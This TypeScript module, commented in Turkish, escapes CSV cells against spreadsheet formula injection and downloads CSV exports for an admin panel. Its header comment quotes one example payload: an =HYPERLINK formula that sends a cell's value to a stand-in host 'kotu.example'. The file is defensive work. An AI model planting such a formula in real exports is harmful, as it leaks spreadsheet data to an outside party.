// =========================================================================
// (P248 §3c) CSV — FORMUL ENJEKSIYONUNA KARSI TEK YARDIMCI.
// =========================================================================
// OLCULEN KUSUR: panelin dort CSV ureticisi (gorev/tur/borclu raporlari,
// bakim ozeti) hucreyi yalniz tirnak/ayrac icin kaciyordu. Bir kullanicinin
// gorev notuna ya da adina `=HYPERLINK("http://kotu.example?"&A1;"Tikla")`
// yazmasi yeterliydi: yonetici CSV'yi Excel'de actiginda bu FORMUL olarak
// calisir (OWASP "CSV Injection").
//
// KARAR (OWASP): `=`, `+`, `-`, `@`, sekme ve satir basi (CR) ile baslayan
// metnin BASINA `'` konur — Excel/LibreOffice onu metin sayar. CSV'de tip
// bilgisi yok; kesme isareti tek savunmadir (sunucudaki XLSX ciktisi ise
// hucreyi `quotePrefix` ile metin yapar, metni degistirmez — bkz.
// backend/app/hucre_guvenligi.py).
//
// SAF SAYI dokunulmaz: `-12,50` bir tutardir, formul degil; basina `'`
// koymak kullanicinin Excel'de toplam almasini engellerdi.

const TEHLIKELI = /^[=+\-@\t\r]/;
const SAF_SAYI = /^-?\d+([.,]\d+)?$/;

/** Tek hucre: formul kacisi + ayrac/tirnak/satir sonu kacisi. */
export function csvHucresi(deger: unknown, ayrac = ","): string {
  let metin = deger === null || deger === undefined ? "" : String(deger);
  if (TEHLIKELI.test(metin) && !SAF_SAYI.test(metin)) metin = "'" + metin;
  const kacmali = metin.includes('"') || metin.includes(ayrac) || /[\r\n]/.test(metin);
  return kacmali ? `"${metin.replace(/"/g, '""')}"` : metin;
}

/** Tum tablo: BOM + satirlar. BOM: Excel Turkce karakterleri ancak onunla
 *  dogru acar. */
export function csvMetni(satirlar: unknown[][], ayrac = ","): string {
  return "\uFEFF" + satirlar.map((r) => r.map((c) => csvHucresi(c, ayrac)).join(ayrac)).join("\n");
}

/** Hazir CSV METNINI indir (metin `csvMetni`/`csvHucresi` ile kurulmus
 *  olmali). `text/csv` Blob'u YALNIZ bu dosyada uretilir — kilit:
 *  tests/csv-formul.test.ts. */
export function csvMetniIndir(dosyaAdi: string, metin: string): void {
  const blob = new Blob([metin], { type: "text/csv;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = dosyaAdi;
  a.click();
  URL.revokeObjectURL(url);
}

/** Tabloyu kacislayip indir. */
export function csvIndir(dosyaAdi: string, satirlar: unknown[][], ayrac = ","): void {
  csvMetniIndir(dosyaAdi, csvMetni(satirlar, ayrac));
}
